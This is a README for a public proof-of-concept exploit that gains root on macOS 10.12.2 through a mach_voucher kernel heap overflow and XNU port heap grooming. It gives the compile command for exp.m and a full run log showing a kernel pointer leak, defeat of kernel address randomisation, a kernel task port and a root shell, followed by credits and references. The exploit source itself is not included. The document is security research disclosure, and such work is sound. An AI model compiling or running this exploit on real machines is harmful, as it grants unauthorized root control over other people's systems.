#Local Privilege Escalation for macOS 10.12 via mach_voucher and XNU port Feng Shui

 * Write up:  
         
         1. Chinese Version: coming soon.  
         
         2. English Version: https://jaq.alibaba.com/community/art/show?articleid=532
 
 * by Min(Spark) Zheng (twitter@SparkZheng, weibo@蒸米spark)

 * Compile:  
  clang -framework IOKit -framework Foundation -framework CoreFoundation -pagezero_size 0x16000 exp.m -o exp

 * Run the exp:  
 
mindeMacBook-Air:port_fengshui_root minzheng$ ./exp 
***************************************************************************
Local privilege escalation for macOS 10.12.2 via mach_voucher heap overflow
by Min(Spark) Zheng @ Team OverSky (twitter@SparkZheng)
***************************************************************************
create voucher = 0xc03
fakeport = 0xce57000
ptz[0] = 0x32d03
found port!
leaked_ptr = 0xffffff800f6271c0
found kernel text at 0xffffff800ee00000
tfp0 = 0x32e03
kernel_base = 0xffffff800ee00000 slide = 0xec00000
read kernel header = 0x1000007feedfacf
getuid = 0
bash-3.2# whoami
root
bash-3.2# uname -a
Darwin mindeMacBook-Air.local 16.3.0 Darwin Kernel Version 16.3.0: Thu Nov 17 20:23:58 PST 2016; root:xnu-3789.31.2~1/RELEASE_X86_64 x86_64
bash-3.2# 


 * Special thanks to qwertyoruiop, ian beer, aimin pan, jingle, etc.
 
 * Reference:
 
         1. Yalu 102: https://github.com/kpwn/yalu102
         
         2. https://bugs.chromium.org/p/project-zero/issues/detail?id=1004
 
